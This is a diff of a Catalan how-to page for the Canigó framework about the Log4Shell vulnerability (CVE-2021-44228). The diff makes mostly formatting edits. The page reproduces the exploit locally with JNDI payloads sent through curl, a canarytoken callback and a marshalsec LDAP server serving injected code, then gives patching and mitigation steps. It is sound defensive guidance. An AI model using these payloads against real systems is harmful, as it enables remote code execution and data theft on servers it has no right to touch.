@@ -9,6 +9,7 @@ description = "Com resoldre la vulnerabilitat detectada CVE-2021-44228 (Log4Shel
 
 La vulnerabilitat [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) permet executar codi en un
 servidor remot, injectant una petició JNDI `${jndi:(ldap|rmi|etc)}` dins de qualsevol variable que es registri al log del servidor.
+
 Per a explotar la vulnerabilitat, es poden seguir els següents passos:
 
 1. En el servidor que alloja l'aplicació vulnerable, es registra la informació que conté la càrrega útil maliciosa.
@@ -33,6 +34,7 @@ Informació de referència:
 ## Com explotar la vulnerabilitat a una aplicació Canigó
 
 * Crear una aplicació Canigó que utilitzi una versió de log4j vulnerable fent ús de l'archetype de Canigó:
+
 ```sh
 # Canigó 3.6.0
 mvn archetype:generate \
@@ -46,6 +48,7 @@ mvn archetype:generate \
 
 * Modificar el servei de prova: `EquipamentServiceController` per a imprimir al log els paràmetres d'entrada
 del servei de creació dels equipaments:
+
 ```java
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -59,6 +62,7 @@ log.error("equipament.getNom() {}", equipament.getNom());
 ```
 
 * Iniciar el projecte creat amb el servidor Tomcat embegut:
+
 ```sh
 mvn clean spring-boot:run
 # or
@@ -85,11 +89,13 @@ Per a més informació:
 Pasos a seguir:
 
 * Generar un token tipus `Log4Shell` des de: <https://canarytokens.org/generate#>:
+
 ```txt
 ${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}
 ```
 
 * Generar una petició HTTP Request per a crear un `equipament` i en el nom enviar el token maliciós creat amb `canarytokens`:
+
 ```sh
 curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
 --header 'Content-Type: application/json' \
@@ -108,10 +114,12 @@ s'inclou la traça de la connexió remota al servidor de l'aplicació:
 ### Utilizant un servidor LDAP local
 
 Requereix: SO Linux, Python3, Git, Maven i accés a internet.
+
 Pasos a seguir:
 
 * Iniciar un servidor web que contingui el codi maliciós a injectar. Es pot utilitzar el projecte `https://github.com/cybereason/Logout4Shell.git`
 i modificar la classe `Log4jRCE.java` per a afegir qualsevol codi maliciós que es vulgui injectar al servidor. Per exemple, es pot injectar una traça:
+
 ```java
 String dateNow = ZonedDateTime.now(ZoneId.of("Europe/Madrid")).format(DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss.SSSZ"));
 System.out.println("Log4JShell - JPJE ----------------------------: " + dateNow);
@@ -125,6 +133,7 @@ python3 -m http.server 8888
 ```
 
 * Iniciar un servidor LDAP. Es pot utilitzar el projecte `https://github.com/mbechler/marshalsec.git`:
+
 ```sh
 git clone https://github.com/mbechler/marshalsec.git
 mvn clean package -DskipTests
@@ -132,6 +141,7 @@ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 
 ```
 
 * Generar una petició HTTP Request per a crear un `equipament` i en el nom enviar `${jndi:ldap://127.0.0.1:1389/a}`:
+
 ```sh
 curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
 --header 'Content-Type: application/json' \
@@ -140,11 +150,11 @@ curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
 
 * Revisar en el log de l'aplicació `CanigoLog4jShellTest` els efectes d'explotar la vulnerabilitat.
 
-    - Amb la vulnerabilitat:
+    > Amb la vulnerabilitat:
 
 ![LDAP exploit](/images/howtos/log4jshell/log4jshell_trace1.gif)
 
-    - Sense la vulnerabilitat:
+    > Sense la vulnerabilitat:
 
 ![LDAP no exploit](/images/howtos/log4jshell/log4jshell_trace2.gif)
 
@@ -153,28 +163,32 @@ D'aquesta manera, per exemple, es podria obtenir les variables d'entorn, arxius 
 
 ## Com solucionar la vulnerabilitat a les aplicacions
 
-* **Opció 1**) Substituir la versió de la dependència de la libreria `log4j` en temps de compilació:
+* **Opció 1**) Substituir la versió de la dependència de la libreria `log4j` en temps de compilació.
 
-    - 1.1) Modificar el fitxer `pom.xml` - **opció recomanada** - i tornar a compilar i desplegar l'aplicació:
+    - 1.1) Modificar el fitxer `pom.xml` - **opció recomanada** -, tornar a compilar i desplegar l'aplicació:
+
 ```xml
 <properties>
 <log4j2.version>2.15.0</log4j2.version>
 </properties>
 ```
 
-    - 1.2) Injectar la variable durant la construcció de l'aplicació i tornar a compilar i desplegar l'aplicació:
+    - 1.2) Injectar la variable durant la construcció de l'aplicació, tornar a compilar i desplegar l'aplicació:
+
 ```sh
 mvn -Dlog4j2.version=2.15.0 clean package && java -jar ./target/CanigoLog4jShellTest.war
 ```
 
-* **Opció 2**) Configurar la variable `log4j2.formatMsgNoLookups` en temps d'execució:
+* **Opció 2**) Configurar la variable `log4j2.formatMsgNoLookups` en temps d'execució.
 
-    - 2.1) Injectar la variable (vàlid per a: 2.10 >= log4j <= 2.14.1) i tornar a desplegar l'aplicació
+    - 2.1) Injectar la variable (vàlid per a: 2.10 >= log4j <= 2.14.1) i tornar a desplegar l'aplicació:
+
 ```sh
 mvn clean package && java -Dlog4j2.formatMsgNoLookups=true -jar ./target/CanigoLog4jShellTest.war
 ```
 
     - 2.2) Afegir una variable d'entorn (vàlid per a: 2.10 >= log4j <= 2.14.1) i tornar a desplegar l'aplicació. Veure: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/.
+
 ```sh
 mvn clean package docker:build \
 && docker run -it --rm \
@@ -215,8 +229,8 @@ per a utilitzar els mòduls de les versions 3.4.7 i 3.6.1. Podeu consultar les m
 
 - [Matrius de Compatibilitats 3.6](/canigo-download-related/matrius-compatibilitats/canigo-36/)
 
-Un cop es comprovi que s'utilitzen les últimes versions dels mòduls, caldrà modificar el fitxer `pom.xml` per a assegurar que s
-'utilitza la versió 2.15.0 del log4j:
+Un cop es comprovi que s'utilitzen les últimes versions dels mòduls, caldrà modificar el fitxer `pom.xml` per a assegurar l'ús
+de la versió 2.15.0 de log4j:
 
 ```xml
 <properties>
@@ -230,5 +244,5 @@ Un cop realitzades les adaptacions descrites, comprovar que només s'utilitza la
 mvn dependency:tree
 ```
 
-<br/>
+<br/><br/>
 Per qualsevol dubte relatiu a aquesta nova versió del Framework Canigó us podeu posar en contacte amb el CS Canigó al servei CAN del JIRA CSTD o enviant-nos un correu electrònic a la bústia del CS Canigó.
